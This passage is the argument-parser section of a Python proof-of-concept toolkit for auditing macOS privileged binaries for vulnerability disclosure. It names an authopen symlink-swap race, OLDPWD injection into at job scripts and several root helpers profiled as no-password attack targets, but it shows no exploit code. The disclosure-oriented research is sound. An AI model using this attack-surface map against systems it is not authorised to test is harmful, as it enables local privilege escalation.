    return 0


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="Lab-safe PoC helpers for the macOS privileged-binary audit."
    )
    subparsers = parser.add_subparsers(dest="command", required=True)

    authopen_parser = subparsers.add_parser(
        "authopen-toctou",
        help="Interactively validate whether authopen follows a swapped symlink after authorization.",
    )
    authopen_parser.add_argument("--output-dir", help="Write artifacts to this directory.")
    authopen_parser.add_argument(
        "--dry-run",
        action="store_true",
        help="Set up the lab files and write instructions without launching authopen.",
    )
    authopen_parser.add_argument(
        "--initial-delay",
        type=float,
        default=1.5,
        help="Seconds to wait before prompting for the swap step.",
    )
    authopen_parser.add_argument(
        "--timeout",
        type=int,
        default=120,
        help="Seconds to wait for authopen to finish after the swap.",
    )
    authopen_parser.set_defaults(func=command_authopen_toctou)

    authopen_sqlite_parser = subparsers.add_parser(
        "authopen-decoy-sqlite",
        help="Interactively validate the same authopen race against a harmless local SQLite database.",
    )
    authopen_sqlite_parser.add_argument("--output-dir", help="Write artifacts to this directory.")
    authopen_sqlite_parser.add_argument(
        "--dry-run",
        action="store_true",
        help="Set up the lab files and write instructions without launching authopen.",
    )
    authopen_sqlite_parser.add_argument(
        "--initial-delay",
        type=float,
        default=1.5,
        help="Seconds to wait before prompting for the swap step.",
    )
    authopen_sqlite_parser.add_argument(
        "--timeout",
        type=int,
        default=120,
        help="Seconds to wait for authopen to finish after the swap.",
    )
    authopen_sqlite_parser.set_defaults(func=command_authopen_decoy_sqlite)

    authopen_pack_parser = subparsers.add_parser(
        "authopen-proof-pack",
        help="Run a control and raced authopen validation pair against the same visible bait path.",
    )
    authopen_pack_parser.add_argument("--output-dir", help="Write artifacts to this directory.")
    authopen_pack_parser.add_argument(
        "--dry-run",
        action="store_true",
        help="Set up lab files and overview text without launching authopen.",
    )
    authopen_pack_parser.add_argument(
        "--initial-delay",
        type=float,
        default=1.5,
        help="Seconds to wait before prompting or approving each phase.",
    )
    authopen_pack_parser.add_argument(
        "--timeout",
        type=int,
        default=120,
        help="Seconds to wait for authopen to finish in each phase.",
    )
    authopen_pack_parser.set_defaults(func=command_authopen_proof_pack)

    oldpwd_parser = subparsers.add_parser(
        "at-oldpwd",
        help="Validate that OLDPWD is emitted raw into the generated at job script.",
    )
    oldpwd_parser.add_argument("--output-dir", help="Write artifacts to this directory.")
    oldpwd_parser.add_argument(
        "--minutes-ahead",
        type=int,
        default=3,
        help="Schedule the temporary job this many minutes in the future.",
    )
    oldpwd_parser.add_argument(
        "--wait-seconds",
        type=int,
        default=0,
        help="Optionally wait this long for the runtime marker to appear.",
    )
    oldpwd_parser.add_argument(
        "--keep-job",
        action="store_true",
        help="Do not remove the temporary at job after inspection.",
    )
    oldpwd_parser.set_defaults(func=command_at_oldpwd)

    env_parser = subparsers.add_parser(
        "at-env",
        help="Check which environment variables are serialized into at job scripts on this build.",
    )
    env_parser.add_argument("--output-dir", help="Write artifacts to this directory.")
    env_parser.add_argument(
        "--minutes-ahead",
        type=int,
        default=3,
        help="Schedule the temporary job this many minutes in the future.",
    )
    env_parser.add_argument(
        "--keep-job",
        action="store_true",
        help="Do not remove the temporary at job after inspection.",
    )
    env_parser.set_defaults(func=command_at_env)

    spool_parser = subparsers.add_parser(
        "spool-enum",
        help="Decode publicly enumerable at job filenames into queue and schedule metadata.",
    )
    spool_parser.add_argument("--output-dir", help="Write artifacts to this directory.")
    spool_parser.set_defaults(func=command_spool_enum)

    scan_parser = subparsers.add_parser(
        "authexec-scan",
        help="Scan app bundles for AuthorizationExecuteWithPrivileges/security_authtrampoline references.",
    )
    scan_parser.add_argument("--output-dir", help="Write artifacts to this directory.")
    scan_parser.add_argument(
        "--roots",
        nargs="+",
        default=["/Applications", "/System/Applications"],
        help="Roots to scan for .app bundles or executables.",
    )
    scan_parser.set_defaults(func=command_authexec_scan)

    trampoline_parser = subparsers.add_parser(
        "security-authtrampoline-profile",
        help="Profile the local security_authtrampoline surface, auth policy, and deprecated API callers.",
    )
    trampoline_parser.add_argument("--output-dir", help="Write artifacts to this directory.")
    trampoline_parser.add_argument(
        "--roots",
        nargs="+",
        default=["/Applications"],
        help="Roots to scan for .app bundles or executables that reference the deprecated API.",
    )
    trampoline_parser.set_defaults(func=command_security_authtrampoline_profile)

    scopedbookmark_parser = subparsers.add_parser(
        "scopedbookmark-profile",
        help="Passively profile ScopedBookmarkAgent and preserve prior local findings for triage.",
    )
    scopedbookmark_parser.add_argument("--output-dir", help="Write artifacts to this directory.")
    scopedbookmark_parser.add_argument(
        "--bundle-id",
        default="com.shapr3d.shapr",
        help="Bundle identifier to resolve locally for context in the report.",
    )
    scopedbookmark_parser.set_defaults(func=command_scopedbookmark_profile)

    writeconfig_parser = subparsers.add_parser(
        "writeconfig-profile",
        help="Profile the local writeconfig.xpc root helper as a no-password Apple target candidate.",
    )
    writeconfig_parser.add_argument("--output-dir", help="Write artifacts to this directory.")
    writeconfig_parser.set_defaults(func=command_writeconfig_profile)

    replayd_parser = subparsers.add_parser(
        "replayd-profile",
        help="Profile replayd private XPC methods as a no-password Apple target candidate.",
    )
    replayd_parser.add_argument("--output-dir", help="Write artifacts to this directory.")
    replayd_parser.set_defaults(func=command_replayd_profile)

    noauth_fs_parser = subparsers.add_parser(
        "noauth-fs-profile",
        help="Profile later no-password filesystem-triggered Apple surfaces on this host.",
    )
    noauth_fs_parser.add_argument("--output-dir", help="Write artifacts to this directory.")
    noauth_fs_parser.set_defaults(func=command_noauth_fs_profile)

    assess_parser = subparsers.add_parser(
        "apple-bounty-assess",
        help="Turn the latest local artifacts into Apple-bounty triage decisions.",
    )
    assess_parser.add_argument("--output-dir", help="Write artifacts to this directory.")
    assess_parser.set_defaults(func=command_bounty_assess)

    disclosure_parser = subparsers.add_parser(
        "disclosure-report",
        help="Build a markdown summary from the latest local PoC artifacts.",
    )
    disclosure_parser.add_argument("--output-dir", help="Write artifacts to this directory.")
    disclosure_parser.set_defaults(func=command_disclosure_report)

    return parser


def main(argv: list[str] | None = None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)
    try:
        return args.func(args)
    except KeyboardInterrupt:
        print("Interrupted.", file=sys.stderr)
        return 130
    except Exception as exc:  # pragma: no cover - CLI path
        print(f"error: {exc}", file=sys.stderr)
        return 1


if __name__ == "__main__":
    raise SystemExit(main())
